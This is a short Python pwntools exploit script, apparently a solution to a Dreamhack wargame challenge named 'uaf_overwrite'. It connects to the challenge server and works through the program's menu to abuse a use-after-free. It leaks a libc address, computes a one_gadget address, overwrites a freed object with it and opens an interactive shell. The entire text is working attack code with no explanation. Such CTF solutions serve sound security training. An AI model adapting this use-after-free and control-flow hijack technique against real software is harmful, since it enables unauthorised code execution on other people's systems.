from pwn import *

context.log_level = "debug"

p = remote("host3.dreamhack.games", 8626)
e = ELF("./uaf_overwrite")


def human(weight, age):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b": ", str(weight).encode())
    p.sendlineafter(b": ", str(age).encode())


def robot(weight):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b": ", str(weight).encode())


def custom(size, data, idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b": ", str(size).encode())
    p.sendafter(b": ", data)
    p.sendlineafter(b": ", str(idx).encode())


custom(0x500, b"AAAA", -1)
custom(0x500, b"AAAA", -1)
custom(0x500, b"AAAA", 0)
custom(0x500, b"B", -1)

lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3EBC42
og = lb + 0x10A41C

human(1, og)
robot(1)

p.interactive()
